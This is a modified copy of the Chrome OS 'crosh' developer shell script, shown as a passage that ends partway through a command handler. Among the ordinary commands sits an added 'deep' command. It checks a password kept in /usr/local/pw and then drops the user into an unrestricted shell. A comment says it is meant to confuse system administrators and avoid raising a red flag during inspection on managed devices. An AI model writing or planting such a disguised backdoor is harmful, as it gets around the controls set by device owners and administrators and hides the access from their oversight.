#!/bin/dash
# Copyright (c) 2012 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
#
# NOTE: This script works in dash, but is not as featureful.  Specifically,
# dash omits readline support (history & command line editing).  So we try
# to run through bash if it exists, otherwise we stick to dash.  All other
# code should be coded to the POSIX standard and avoid bashisms.
#
# Please test that any changes continue to work in dash by running
# '/build/$BOARD/bin/dash crosh --dash' before checking them in.

# Disable path expansion at the command line.  None of our builtins need or want
# it, and it's safer/saner to disallow it in the first place.
set -f

# Don't allow SIGHUP to terminate crosh. This guarantees that even if the user
# closes the crosh window, we make our way back up to the main loop, which gives
# cleanup code in command handlers a chance to run.
trap '' HUP

# Do not let CTRL+C or CTRL+\ kill crosh itself.  This does let the user kill
# commands that are run by crosh (like `ping`).
trap : INT QUIT

# If it exists, use $DATA_DIR to define the $HOME location, as a first step
# to entirely removing the use of $HOME. (Though HOME should be used as
# fall-back when DATA_DIR is unset.)
# TODO(keescook): remove $HOME entirely crbug.com/333031
if [ "${DATA_DIR+set}" = "set" ]; then
  export HOME="${DATA_DIR}/user"
fi

IS_BASH=0
try_bash() {
  # If dash was explicitly requested, then nothing to do.
  case " $* " in
  *" --dash "*) return 0;;
  esac

  # If we're already bash, then nothing to do.
  if type "history" 2>/dev/null | grep -q "shell builtin"; then
    IS_BASH=1
    return 0
  fi

  # Still here?  Relaunch in bash.
  exec /bin/bash "$0" "$@"
}
try_bash "$@"

INTRO_TEXT="Welcome to crosh, the Chrome OS developer shell.

If you got here by mistake, don't panic!  Just close this tab and carry on.

Type 'help' for a list of commands.

If you want to customize the look/behavior, you can use the options page.
Load it by using the Ctrl+Shift+P keyboard shortcut.
"

# This crosh file was made for version 81. Things may not be compatible, but hey, your chromebook shouldn't be in devmode and enrolled.

# Gets set to "1" when in dev mode.
CROSH_DEVMODE=
# Gets set to "1" when running on removable media (e.g. USB stick).
CROSH_REMOVABLE=
CROSH_MODPATH="/usr/share/crosh"
# Gets set to "1" when a single command is being executed followed by exit.
CROSH_SINGLE_COMMAND=

check_digits() {
  expr "$1" : '^[[:digit:]]*$' > /dev/null
}

# Load all modules found in the specified subdir.
load_modules() {
  local subdir="$1"
  local dir="${CROSH_MODPATH}/${subdir}"
  local mod

  # Turn on path expansion long enough to find local modules.
  set +f
  for mod in "${dir}"/[0-9][0-9]-*.sh; do
    # Then turn path expansion back off.
    set -f
    if [ -e "${mod}" ]; then
      if [ "${CROSH_SINGLE_COMMAND}" != "1" ]; then
        echo "Loading extra module: ${mod}"
      fi
      . "${mod}" || :
    fi
  done
}

load_extra_crosh() {
  # First load the common modules (board/project/etc... specific).
  load_modules "extra.d"

  # Load the removable modules, if the rootfs is on removable
  # media.  e.g. It's a USB stick.
  if [ -z "${CROSH_REMOVABLE}" ]; then
    local src
    if [ -e /usr/share/misc/chromeos-common.sh ]; then
      . "/usr/share/misc/chromeos-common.sh" || exit 1

      src="$(get_block_dev_from_partition_dev "$(rootdev -s)")"
      local removable="$(cat "/sys/block/${src#/dev/}/removable" 2>/dev/null)"
      if [ "${removable}" = "1" ]; then
        CROSH_REMOVABLE="1"
      fi
    fi
  fi
  if [ "${CROSH_REMOVABLE}" = "1" ]; then
    load_modules "removable.d"
  fi

  # Load the dev-mode modules, if in dev mode, or if forced.
  # This comes last so it can override any release modules.
  if [ -z "${CROSH_DEVMODE}" ]; then
    if type crossystem >/dev/null 2>&1; then
      crossystem "cros_debug?1"
      CROSH_DEVMODE="$((!$?))"
    else
      echo "Could not locate 'crossystem'; assuming devmode is off."
    fi
  fi
  if [ "${CROSH_DEVMODE}" = "1" ]; then
    load_modules "dev.d"
  fi

}

shell_read() {
  local prompt="$1"
  shift

  if [ "$IS_BASH" -eq "1" ]; then
    # In bash, -e gives readline support.
    read -p "$prompt" -e "$@"
  else
    read -p "$prompt" "$@"
  fi
}

shell_history() {
  if [ "$IS_BASH" -eq "1" ]; then
    # In bash, the history builtin can be used to manage readline history
    history "$@"
  fi
}

shell_history_init() {
  # Do not set any HISTXXX vars until after security check below.
  local histfile="${HOME}/.crosh_history"

  # Limit the history to the last 100 entries to keep the file from growing
  # out of control (unlikely, but let's be safe).
  local histsize="100"

  # For security sake, let's clean up the file before we let the shell get a
  # chance to read it.  Clean out any non-printable ASCII chars (sorry UTF8
  # users) as it's the easiest way to be sure.  We limit to 4k to be sane.
  # We need a tempfile on the same device to avoid races w/multiple crosh
  # tabs opening at the same time.
  local tmpfile
  if ! tmpfile="$(mktemp "${histfile}.XXXXXX")"; then
    echo "warning: could not clean up history; ignoring it"
    return
  fi
  # Ignore cat errors in case it doesn't exist yet.
  cat "${histfile}" 2>/dev/null |
    tr -dc '[:print:]\t\n' |
    tail -n "${histsize}" |
    tail -c 4096 > "${tmpfile}"
  if ! mv "${tmpfile}" "${histfile}"; then
    echo "warning: could not clean up history; ignoring it"
    rm -f "${tmpfile}"
    return
  fi

  # Set this before any other history settings as some of them implicitly
  # operate on this file.
  HISTFILE="${histfile}"

  # Now we can limit the size of the history file.
  HISTSIZE="${histsize}"
  HISTFILESIZE="${histsize}"

  # Do not add entries that begin with a space, and dedupe sequential commands.
  HISTCONTROL="ignoreboth"

  # Initialize pseudo completion support.  Do it before we load the user's
  # history so that new entries don't come after old ones.
  if [ ${IS_BASH} -eq 1 ]; then
    local f
    for f in $(registered_visible_commands); do
      # Do not add duplicates to avoid ballooning history.
      grep -qs "^${f} *$" "${HISTFILE}" || shell_history -s "${f}"
    done
  fi

  # Now load the user's history.
  shell_history -r "${HISTFILE}"
}

# Returns status 0 if the argument is a valid positive integer
# (i.e. it's not the null string, and contains only digits).
is_numeric() {
  ! echo "$1" | grep -qE '[^0-9]|^$'
}

# Prints the value corresponding to the passed-in field in the output from
# dump_power_status.
get_power_status_field() {
  local field="$1"
  dump_power_status | awk -v field="${field}" '$1 == field { print $2 }'
}

# Returns value of variable with given name.
expand_var() {
  local var="$1"
  eval echo "\"\$${var}\""
}

# Determine whether the variable is set in the environment.
var_is_set() {
  local var="$1"
  [ "$(expand_var "{${var}+set}")" = "set" ]
}

USAGE_help='[command]'
HELP_help='
  Display general help, or details for a specific command.
'
cmd_help() (
  local cmd

  case $# in
  0)
    local cmds="exit help help_advanced ping top"
    for cmd in ${cmds}; do
      cmd_help "${cmd}"
    done
    ;;
  1)
    # The ordering and relationship of variables here is subtle.
    # Consult README.md for more details.
    cmd="$1"
    if ! registered_crosh_command "${cmd}"; then
      echo "help: unknown command '${cmd}'"
      return 1
    elif ! check_command_available "${cmd}"; then
      echo "help: command '${cmd}' is not available"
      return 1
    else
      # If the command has a custom help func, call it.
      if registered_crosh_command_help "${cmd}"; then
        # Make sure the output is at least somewhat close to our standardized
        # form below.  We always want the program name first and a blank line
        # at the end.  This way `help_advanced` isn't completely ugly.
        echo "${cmd}"
        # The sed statement trims the first & last lines if they're blank.
        "help_${cmd}" | sed -e '1{/^$/d}' -e '${/^$/d}'
        echo

      elif var_is_set "USAGE_${cmd}"; then
        # Only show this function if the usage strings are actually set.
        local usage="$(expand_var "USAGE_${cmd}")"
        local help="$(expand_var "HELP_${cmd}")"
        printf '%s %s  %s\n\n' "${cmd}" "${usage}" "${help}"
      fi
    fi
    ;;
  *)
    help "too many arguments"
    return 1
    ;;
  esac
)

# Useful alias for commands to call us.
help() {
  if [ $# -ne 0 ]; then
    printf 'ERROR: %s\n\n' "$*"
  fi

  # This is set by `dispatch` when a valid command has been found.
  if [ -n "${CURRENT_COMMAND}" ]; then
    cmd_help "${CURRENT_COMMAND}"
  fi
}

USAGE_help_advanced=''
HELP_help_advanced='
  Display the help for more advanced commands, mainly used for debugging.
'
cmd_help_advanced() (
  local cmd

  if [ $# -ne 0 ]; then
    help "too many arguments"
    return 1
  fi

  for cmd in $(registered_visible_commands); do
    if check_command_available "${cmd}"; then
      cmd_help "${cmd}"
    fi
  done
)

# We move the trailing brace to the next line so that we avoid the style
# checker from rejecting the use of braces.  We cannot use subshells here
# as we want the set the exit variable in crosh itself.
# http://crbug.com/318368
USAGE_exit=''
HELP_exit='
  Exit crosh.
'
cmd_exit()
{
  exit='y'
}


USAGE_deep=''
HELP_deep='Enables deep interactive shell. Requires password'
cmd_deep() {
read -s -p "Enter the configured password: " pass
if [ $pass = $(cat /usr/local/pw) ]; then
printf "\n\e[32mDeep authentication successful\e[0m: To change your password, edit /usr/local/pw. To use mush, run \'mush\'!\n"
printf "\e[32mCurrently executing $SHELL \e[0m: To change this change the value of \$SHELL\n"
$SHELL
else
echo -e "\n\e[31mDeep authentication failed\e[0m: Please re-enter your password."
fi
#The purpose is not to be that secure, but to confuse system administrators and not set off a red flag during inspection
}


USAGE_set_time='[<time string>]'
HELP_set_time='
  Sets the system time if the the system has been unable to get it from the
  network.  The <time string> uses the format of the GNU coreutils date command.
'
cmd_set_time() (
  local spec="$*"
  if [ -z "${spec}" ]; then
    echo "A date/time specification is required."
    echo "E.g., set_time 10 February 2012 11:21am"
    echo "(Remember to set your timezone in Settings first.)"
    return
  fi
  local sec status
  sec="$(date +%s --date="${spec}" 2>&1)"
  status="$?"
  if [ ${status} -ne 0 -o -z "${sec}" ]; then
    echo "Unable to understand the specified time:"
    echo "${sec}"
    return
  fi
  local reply
  reply="$(dbus-send --system --type=method_call --print-reply \
    --dest=org.torproject.tlsdate /org/torproject/tlsdate \
    org.torproject.tlsdate.SetTime "int64:$((sec))" 2>/dev/null)"
  status="$?"
  if [ ${status} -ne 0 ]; then
    echo "Time not set. Unable to communicate with the time service."
    return
  fi
  # Reply format: <dbus response header>\n    uint32 <code>\n
  local code
  code="$(echo "${reply}" | sed -n -E '$s/.*uint32 ([0-9]).*/\1/p')"
  case "${code}" in
  0)
    echo "Time has been set."
    ;;
  1)
    echo "Requested time was invalid (too large or too small): ${sec}"
    ;;
  2)
    echo "Time not set. Network time cannot be overriden."
    ;;
  3)
    echo "Time not set. There was a communication error."
    ;;
  *)
    echo "An unexpected response was received: ${code}"
    echo "Details: ${reply}"
  esac
)

# Check if a particular Chrome feature is enabled.
# Use the DBus method name as the parameter.
is_chrome_feature_enabled() {
  local method="$1"
  local reply status
  reply="$(dbus-send --system --type=method_call --print-reply \
    --dest=org.chromium.ChromeFeaturesService \
    /org/chromium/ChromeFeaturesService \
    "org.chromium.ChromeFeaturesServiceInterface.${method}" \
    "string:${CROS_USER_ID_HASH}" 2>/dev/null)"
  status="$?"
  [ ${status} -eq 0 -a "${reply##* }" = "true" ]
}


imageloader() {
  # Default timeout 30 seconds.
  local timeout="--reply-timeout=30000"
  case $1 in
  --reply-timeout=*) timeout="$1"; shift;;
  esac
  local method="$1"; shift

  dbus-send "${timeout}" --system --type=method_call \
    --fixed --print-reply --dest=org.chromium.ComponentUpdaterService \
    /org/chromium/ComponentUpdaterService \
    "org.chromium.ComponentUpdaterService.${method}" "$@" \
    2>&1 >/dev/null
}

HELP_vmc=''
EXEC_vmc='/usr/bin/vmc'
cmd_vmc() (
  if ! is_chrome_feature_enabled "IsCrostiniEnabled"; then
    if ! is_chrome_feature_enabled "IsPluginVmEnabled"; then
      echo "This command is not available."
      return 1
    fi
  fi

  if ! is_chrome_feature_enabled "IsVmManagementCliAllowed"; then
    echo "This command is disabled by your system administrator."
    return 1
  fi

  vmc "$@"
)
help_vmc() (
  vmc --help
)

USAGE_vsh='<vm_name> [<container_name>]'
HELP_vsh='
  Connect to a shell inside the VM <vm_name>, or to a shell inside the container
  <container_name> within the VM <vm_name>.
'
EXEC_vsh='/usr/bin/vsh'
cmd_vsh() (
  if ! is_chrome_feature_enabled "IsCrostiniEnabled"; then
    echo "This command is not available."
    return 1
  fi

  if ! is_chrome_feature_enabled "IsVmManagementCliAllowed"; then
    echo "This command is disabled by your system administrator."
    return 1
  fi

  if [ $# -ne 1 -a $# -ne 2 ]; then
    help "Missing vm_name"
    return 1
  fi

  local vm_name="$1"; shift
  if [ $# -eq 1 ]; then
    local container_name="$1"; shift
    vsh --vm_name="${vm_name}" --owner_id="${CROS_USER_ID_HASH}" \
      --target_container="${container_name}"
  else
    vsh --vm_name="${vm_name}" --owner_id="${CROS_USER_ID_HASH}" -- \
      LXD_DIR=/mnt/stateful/lxd \
      LXD_CONF=/mnt/stateful/lxd_conf
  fi

)

# Set the vars to pass the unittests ...
USAGE_ssh=''
HELP_ssh=''
# ... then unset them to hide the command from "help" output.
unset USAGE_ssh HELP_ssh
cmd_ssh() (
  cat <<EOF
The 'ssh' command has been removed.  Please install the official SSH extension:
https://chrome.google.com/webstore/detail/pnhechapfaindjhompbnflcldabbghjo
EOF
)

USAGE_swap='[ enable <size (MB)> | disable | start | stop | status
 | set_margin <discard threshold (MB)> | set_extra_free <amount (MB)>
 | set_min_filelist <amount (MB)> ]'
HELP_swap='
  Change kernel memory manager parameters
  (FOR EXPERIMENTS ONLY --- USE AT OWN RISK)

  "swap status" (also "swap" with no arguments) shows the values of various
  memory manager parameters and related statistics.

  The enable/disable options enable or disable compressed swap (zram)
  persistently across reboots, and take effect at the next boot.  The enable
  option takes the size of the swap area (in megabytes before compression).
  If the size is omitted, the factory default is chosen.

  The start/stop options turn swap on/off immediately, but leave the settings
  alone, so that the original behavior is restored at the next boot.

  WARNING: if swap is in use, turning it off can cause the system to
  temporarily hang while the kernel frees up memory.  This can take
  a long time to finish.

  The set_margin, set_min_filelist, and set_extra_free options change
  kernel parameters with similar names.  The change is immediate and
  persistent across reboots.  Using the string "default" as the value
  restores the factory default behavior.
'
cmd_swap() (
  local cmd="${1:-}"
  shift

  # Check the usage first.
  case "${cmd}" in
  enable)
    if [ $# -gt 1 ]; then
      help "${cmd} takes only one optional argument"
      return 1
    fi
    ;;
  disable|start|stop|status|"")
    if [ $# -ne 0 ]; then
      help "${cmd} takes no arguments"
      return 1
    fi
    ;;
  set_margin|set_extra_free|set_min_filelist)
    if [ $# -ne 1 ]; then
      help "${cmd} takes one argument"
      return 1
    fi
    ;;
  *)
    help "unknown option: ${cmd}"
    return 1
    ;;
  esac

  # Then actually process the request.
  case "${cmd}" in
  "enable")
    local size="${1:-default}"
    if [ "${size}" = "default" ]; then
      size=-1
    elif ! is_numeric "${size}"; then
      help "'${size}' is not a valid number"
      return 1
    fi
    debugd SwapEnable "int32:${size}" "boolean:false"
    ;;
  "disable")
    debugd SwapDisable "boolean:false"
    ;;
  "start")
    debugd SwapStartStop "boolean:true"
    ;;
  "stop")
    debugd SwapStartStop "boolean:false"
    ;;
  "set_margin"|"set_extra_free"|"set_min_filelist")
    local amount="$1"
    if [ "${amount}" = "default" ]; then
      # Special value requesting use of the factory default value.
      amount=-1
    elif ! is_numeric "${amount}"; then
      help "${cmd} takes a positive integer argument"
      return 1
    fi
    debugd SwapSetParameter "string:${cmd#set_}" "int32:${amount}"
    ;;
  "status"|"")
    debugd SwapStatus
    ;;
  esac
)

USAGE_time_info=''
HELP_time_info='
  Returns the current synchronization state for the time service.
'
cmd_time_info() (
  echo "Last time synchronization information:"
  dbus-send --system --type=method_call --print-reply \
      --dest=org.torproject.tlsdate /org/torproject/tlsdate \
      org.torproject.tlsdate.LastSyncInfo 2>/dev/null |
    sed -n \
        -e 's/boolean/network-synchronized:/p' \
        -e 's/string/last-source:/p' \
        -e 's/int64/last-synced-time:/p'
)

USAGE_bt_console='[<agent capability>]'
HELP_bt_console='
  Enters a Bluetooth debugging console. Optional argument specifies the
  capability of a pairing agent the console will provide; see the Bluetooth
  Core specification for valid options.
'
EXEC_bt_console='/usr/bin/bluetoothctl'
cmd_bt_console() (
  "${EXEC_bt_console}" "${1:+--agent=$1}"
)

USAGE_cras='[ enable <flag> | disable <flag> ]'
HELP_cras='Set flags inside CRAS(CrOS Audio Server). Note that all flag
changes made through this command do not persist after reboot.
Available flags:
 - wbs: Turn on this flag to make CRAS try to use wideband speech mode in
    Bluetooth HFP, if both the Bluetooth controller and peripheral supports
    this feature.
'
cmd_cras() (
  if [ $# -lt 1 ]; then
    help "unexpected number of argument"
    return 1
  fi

  local enabled

  case "$1" in
  enable)
    enabled="true"
    ;;
  disable)
    enabled="false"
    ;;
  *)
    help "Unknown option $1"
    return 1
    ;;
  esac

  if [ $# -ne 2 ]; then
    help "specify flag to set"
    return 1
  fi
  case "$2" in
  wbs)
    dbus-send --system --type=method_call --print-reply \
        --dest=org.chromium.cras /org/chromium/cras \
        org.chromium.cras.Control.SetWbsEnabled "boolean:${enabled}"
    ;;
  *)
    help "Unkown flag $2"
    return 1
    ;;
  esac
)

USAGE_newblue='< status | enable | disable >'
HELP_newblue='Set the preference of enabling/disabling the use of Newblue
Bluetooth stack. In order for the preference to take effect, please login as
the owner account and go to chrome://flags to enable the "Newblue" flag and
reboot the device.
'
cmd_newblue() (
  if [ $# -gt 1 ]; then
    help "unexpected number of argument"
    return 1
  fi

  local enabled reply

  case "$1" in
    status|"")
      reply="$(dbus-send --system --type=method_call --print-reply \
          --dest=org.bluez /org/bluez \
          org.chromium.BluetoothExperimental.GetNewblueEnabled 2>&1)"

      if [ $? -ne 0 ]; then
        echo "ERROR: querying newblue status failed"
        echo "${reply}"
        return 1
      fi

      # reply will look like this
      # method return time=xxx sender:yyy ... reply_serial=z string "enabled"
      # use sed to extract part between the quotes
      echo "${reply}" | sed -n -E '$s/.*string "(.*)"/\1/p'
      return
      ;;
    enable)
      enabled="true"
      ;;
    disable)
      enabled="false"
      ;;
    *)
      help "unknown option $1"
      return 1
      ;;
  esac

  reply="$(dbus-send --system --print-reply --type=method_call \
      --dest=org.bluez /org/bluez \
      org.chromium.BluetoothExperimental.SetNewblueEnabled \
      "boolean:${enabled}" 2>&1)"

  if [ $? -ne 0 ]; then
    echo "ERROR: setting newblue status failed"
    echo "${reply}"
    return 1
  fi
)

# Set the help string so crosh can discover us automatically.
HELP_ff_debug=''
EXEC_ff_debug='/usr/bin/ff_debug'
cmd_ff_debug() (
  debugd_shill ff_debug "$@"
)
help_ff_debug() (
  cmd_ff_debug --help
)

# Set the vars to pass the unittests ...
USAGE_wpa_debug=''
HELP_wpa_debug=''
# ... then unset them to hide the command from "help" output.
unset USAGE_wpa_debug HELP_wpa_debug
cmd_wpa_debug() (
  cat <<EOF
This command has been removed.  Please use the Chrome page instead, and select
Wi-Fi there:
chrome://net-internals/#chromeos
EOF
)

USAGE_authpolicy_debug='<level>'
HELP_authpolicy_debug='
  Set authpolicy daemon debugging level.
  <level> can be 0 (quiet), 1 (taciturn), 2 (chatty), or 3 (verbose).
'
cmd_authpolicy_debug() (
  if [ $# -ne 1 ]; then
    help "exactly one argument (level) accepted"
    return 1
  fi
  local level="$1"
  if ! check_digits "${level}"; then
    help "level must be a number"
    return 1
  fi

  local reply status
  reply="$(dbus-send --system --type=method_call --print-reply \
      --dest=org.chromium.AuthPolicy /org/chromium/AuthPolicy \
      "org.chromium.AuthPolicy.SetDefaultLogLevel" "int32:$1" 2>&1)"
  status="$?"
  if [ ${status} -ne 0 ]; then
    echo "ERROR: ${reply}"
    return 1
  fi
  # Reply format: <dbus response header>\n    string "<error_message>"\n
  local error_message
  error_message="$(echo "${reply}" | sed -n -E '$s/.*string "(.*)"/\1/p')"
  if [ "${error_message}" = "" ]; then
    echo "Successfully set debugging level to ${level}."
    if [ ${level} -gt 0 ]; then
      echo "Debug logs turned on for 30 minutes. Be sure to turn them off again"
      echo "when you are done, e.g. by rebooting the device or setting the"
      echo "level to 0. Authpolicy debugging info will be written into"
      echo "/var/log/authpolicy.log, and will be attached to the next Feedback"
      echo "report you send to Google. You may review these logs before sending"
      echo "them."
    else
      echo "Debug logs turned off."
    fi
  else
    help "${error_message}"
  fi
)

USAGE_set_arpgw='<true | false>'
HELP_set_arpgw='
  Turn on extra network state checking to make sure the default gateway
  is reachable.
'
cmd_set_arpgw() (
  debugd_shill set_arpgw "$@"
)

USAGE_set_wake_on_lan='<true | false>'
HELP_set_wake_on_lan='
  Enable or disable Wake on LAN for Ethernet devices.  This command takes
  effect after re-connecting to Ethernet and is not persistent across system
  restarts.
'
cmd_set_wake_on_lan() (
  debugd_shill set_wake_on_lan "$@"
)

USAGE_wifi_power_save='< status | enable | disable >'
HELP_wifi_power_save='
  Enable or disable WiFi power save mode.  This command is not persistent across
  system restarts.
'
cmd_wifi_power_save() (
  case "$1" in
    "status"|"")
      debugd GetWifiPowerSave
      ;;
    "enable")
      debugd SetWifiPowerSave "boolean:true"
      ;;
    "disable")
      debugd SetWifiPowerSave "boolean:false"
      ;;
    *)
      help "unknown option: $1"
      return 1
      ;;
  esac
)

# Set the help string so crosh can discover us automatically.
HELP_network_diag=''
EXEC_network_diag='/usr/bin/network_diag'
cmd_network_diag() (
  case " $* " in
  *" --no-log "*)
    debugd_shill network_diag "$@"
    ;;
  *)
    # Create a mostly unique filename.  We won't care about clobbering existing
    # files here as this is a user generated request, and we scope the filename
    # to this specific use case.
    local downloads_dir="/home/user/${CROS_USER_ID_HASH}/Downloads"
    local timestamp="$(date +'%Y-%m-%d.%H-%M-%S')"
    local logname="network_diagnostics_${timestamp}.txt"
    local logpath="${downloads_dir}/${logname}"
    rm -f "${logpath}"
    echo "Saving output to Downloads under: ${logname}"
    debugd_shill network_diag "$@" | tee "${logpath}"
    ;;
  esac
)
help_network_diag() (
  debugd_shill network_diag --help
)

u2f_warning='
  ### IMPORTANT: The U2F feature is experimental and not suitable for
  ### general production use in its current form. The current
  ### implementation is still in flux and some features (including
  ### security-relevant ones) are still missing. You are welcome to
  ### play with this, but use at your own risk. You have been warned.
'

USAGE_u2f_flags='<u2f | g2f>[, user keys, verbose]'
HELP_u2f_flags="
${u2f_warning}
  Set flags to override the second-factor authentication daemon configuration.
  u2f: Always enable the standard U2F mode even if not set in device policy.
  g2f: Always enable the U2F mode plus some additional extensions.
  user_keys: Enable user-specific keys.
  verbose: Increase the daemon logging verbosity in /var/log/messages.
"
cmd_u2f_flags() (
  echo "${u2f_warning}"
  debugd SetU2fFlags "string:$*"
)

debugd() {
  # Default timeout 30 seconds.
  local timeout="--reply-timeout=30000"
  case $1 in
  --reply-timeout=*) timeout="$1"; shift;;
  esac
  local method="$1"; shift
  dbus-send "${timeout}" --system --print-reply --fixed \
      --dest=org.chromium.debugd /org/chromium/debugd \
      "org.chromium.debugd.$method" "$@"
}

# Run a debugd command for a long time and poll its output.
# This expects Start & Stop methods.
debugd_poll() (
  local methodbase="$1"; shift

  local pid fifo

  # Make sure we clean up the background process and temp files when the
  # user kills us with CTRL+C or CTRL+\.
  cleanup() {
    # Don't let the user kill us while cleaning up.
    trap : INT QUIT

    if [ -n "${pid}" ]; then
      if ! debugd "${methodbase}Stop" "string:${pid}"; then
        echo "warning: could not stop ${methodbase}"
      fi
      pid=''
    fi

    if [ -n "${fifo}" ]; then
      dir="$(dirname "${fifo}")"
      rm -rf "${dir}"
      fifo=''
    fi
  }
  trap cleanup INT QUIT

  if ! fifo="$(mk_fifo)"; then
    # The mk_fifo command already showed a warning.
    return 1
  fi
  debugd "${methodbase}Start" "$@" 2>&1 >"${fifo}" &

  read pid < "${fifo}"

  # Background cat and block with `wait` to give debugd a chance to flush
  # output on trapped signal.
  cat "${fifo}" &
  wait $!

  cleanup
)

# Run a shill script via debugd.
debugd_shill() {
  local script="$1"; shift
  local args="$(printf '%s,' "$@")"
  debugd_poll RunShillScript "fd:1" "string:${script}" "array:string:${args%,}"
}

USAGE_ping="[-4] [-6] [-c count] [-i interval] [-n] [-s packetsize] \
[-W waittime] <destination>"
HELP_ping='
  Send ICMP ECHO_REQUEST packets to a network host.  If <destination> is "gw"
  then the next hop gateway for the default route is used.
  Default is to use IPv4 [-4] rather than IPv6 [-6] addresses.
'
cmd_ping() (
  local option="dict:string:variant:"
  local ip_flag="-4"
  local dest

  while [ $# -gt 0 ]; do
    # Do just enough parsing to filter/map options; we
    # depend on ping to handle final validation.
    case "$1" in
    -4) option="${option}v6,boolean:false," ;;
    -6) ip_flag="-6"; option="${option}v6,boolean:true," ;;
    -i) shift; option="${option}interval,int32:$1," ;;
    -c) shift; option="${option}count,int32:$1," ;;
    -W) shift; option="${option}waittime,int32:$1," ;;
    -s) shift; option="${option}packetsize,int32:$1," ;;
    -n) option="${option}numeric,boolean:true," ;;
    -b) option="${option}broadcast,boolean:true," ;;
    -*)
      help "unknown option: $1"
      return 1
      ;;
    *)
      if [ "${dest+set}" = "set" ]; then
        help "too many destinations specified"
        return 1
      fi
      dest="$1"
      ;;
    esac

    shift
  done

  if [ "${dest+set}" != "set" ]; then
    help "missing parameter: destination"
    return 1
  fi

  # Convenient shorthand for the next-hop gateway attached to the
  # default route for the highest priority interface for that IP
  # version; this means if you have a host named "gw" then you'll need
  # to specify a FQDN or IP address.
  if [ "${dest}" = "gw" ]; then
    # The default route with the lowest metric represents the default
    # route for the primary device for that IP version.
    local metric="$(ip "${ip_flag}" route show table 0 | \
        sed -nE 's/^default .* metric ([0-9]+).*/\1/p' | sort -n | head -n1)"
    local main_route="$(ip "${ip_flag}" route show table 0 | \
        grep "^default .* metric ${metric} ")"
    dest="$(echo "${main_route}" | awk '{print $3}')"
    # Ping cannot handle link-local v6 addresses like v4 or global v6
    # addresses. It is necessary to provide ping with the format
    # ${addr}%${interface} OR -I ${interface} when that is the case.
    if [ "${ip_flag}" = "-6" ]; then
      local dev="$(echo "${main_route}" | awk '{print $5}')"
      option="${option}interface,string:${dev},"
    fi
    if [ -z "${dest}" ]; then
      echo "Cannot determine primary gateway; routing table is:"
      cmd_route
      return 1
    fi
  fi

  # Remove trailing comma in the options list if it exists.
  debugd_poll Ping "fd:1" "string:${dest}" "${option%,}"
)

USAGE_chaps_debug='[start|stop|<log_level>]'
HELP_chaps_debug='
  Sets the chapsd logging level.  No arguments will start verbose logging.
'
cmd_chaps_debug() (
  local level="${1:--2}"
  if [ "$1" = "stop" ]; then
    level=0
  fi
  if [ "$1" = "start" ]; then
    level=-2
  fi
  /usr/bin/chaps_client --set_log_level="${level}" 2> /dev/null
  if [ $? -eq 0 ]; then
    echo "Logging level set to ${level}."
  else
    echo "Failed to set logging level."
  fi
)

USAGE_route='[-4] [-6]'
HELP_route='
  Display the routing tables.
  Default is to show IPv4 [-4] rather than IPv6 [-6] routes.
'
cmd_route() (
  local option="dict:string:variant:"

  while [ $# -gt 0 ]; do
    case $1 in
    -4) option="${option}v6,boolean:false," ;;
    -6) option="${option}v6,boolean:true," ;;
    *)
      help "unknown option: $1"
      return 1
    esac
    shift
  done

  debugd GetRoutes "${option%,}"
)

USAGE_tracepath='[-4] [-6] [-n] <destination>[/port]'
HELP_tracepath='
  Trace the path/route to a network host.
  Default is to trace IPv4 [-4] rather than IPv6 [-6] targets.
'
cmd_tracepath() (
  local option="dict:string:variant:"
  local dest

  while [ $# -gt 0 ]; do
    # Do just enough parsing to filter/map options; we
    # depend on tracepath to handle final validation.
    case "$1" in
    -4) option="${option}v6,boolean:false," ;;
    -6) option="${option}v6,boolean:true," ;;
    -n) option="${option}numeric,boolean:true," ;;
    -*)
      help "unknown option: $1"
      return 1
      ;;
    *)
      if [ "${dest+set}" = "set" ]; then
        help "too many destinations specified"
        return 1
      fi
      dest="$1"
      ;;
    esac

    shift
  done

  if [ "${dest+set}" != "set" ]; then
    help "missing parameter: destination"
    return 1
  fi

  # Remove trailing comma in the options list if it exists.
  debugd_poll TracePath "fd:1" "string:${dest}" "${option%,}"
)

USAGE_top=''
HELP_top='
  Run top.
'
cmd_top() (
  # -s is "secure" mode, which disables kill, renice, and change display/sleep
  # interval.  Set HOME to /mnt/empty to make sure we don't parse any files in
  # the stateful partition.  https://crbug.com/677934
  HOME="/mnt/empty" top -s
)

USAGE_modem='<command> [args...]'
HELP_modem='
  Interact with the 3G modem. Run "modem help" for detailed help.
'
cmd_modem() (
  debugd_shill modem "$@"
)

USAGE_set_apn='[-c] [-n <network-id>] [-u <username>] [-p <password>] <apn>'
HELP_set_apn='
  Set the APN to use when connecting to the network specified by <network-id>.
  If <network-id> is not specified, use the network-id of the currently
  registered network.

  The -c option clears the APN to be used, so that the default APN will be used
  instead.
'
cmd_set_apn() (
  debugd_shill set_apn "$@"
)

USAGE_set_cellular_ppp='[-c] [-u <username>] [-p <password>]'
HELP_set_cellular_ppp='
  Set the PPP username and/or password for an existing cellular connection.
  If neither -u nor -p is provided, show the existing PPP username for
  the cellular connection.

  The -c option clears any existing PPP username and PPP password for an
  existing cellular connection.
'
cmd_set_cellular_ppp() (
  /usr/bin/set_cellular_ppp "$@"
)

USAGE_connectivity=''
HELP_connectivity='
  Shows connectivity status.  "connectivity help" for more details
'
cmd_connectivity() (
  /usr/bin/connectivity "$@"
)

USAGE_autest='[--scheduled]'
HELP_autest='
  Trigger an auto-update against a **test** update server.

  WARNING: This may update to an untested version of Chrome OS which was never
  intended for end users!

  The --scheduled option fakes a scheduled update.
'
cmd_autest() (
  local omaha_url="autest"

  if [ "$1" = "--scheduled" ]; then
    # pretend that this is a scheduled check as opposed to an user-initiated
    # check for testing features that get enabled only on scheduled checks.
    omaha_url="autest-scheduled"
  fi

  while [ $# -gt 0 ]; do
    case "$1" in
      "--scheduled")
        omaha_url="autest-scheduled"
        ;;

      *)
        help "unknown option: $1"
        return 1
        ;;
    esac
    shift
  done

  echo "Calling update_engine_client with omaha_url = $omaha_url"
  /usr/bin/update_engine_client "--omaha_url=$omaha_url"
)

USAGE_p2p_update='[enable|disable] [--num-connections] [--show-peers]'
HELP_p2p_update='
  Enables or disables the peer-to-peer (P2P) sharing of updates over the local
  network. This will both attempt to get updates from other peers in the
  network and share the downloaded updates with them. Run this command without
  arguments to see the current state.  Additional switches will display number
  of connections and P2P peers.
'
cmd_p2p_update() (

  if [ "$1" = "" ]; then
    /usr/bin/update_engine_client -show_p2p_update
  fi

  while [ $# -gt 0 ]; do
    case "$1" in
      "enable")
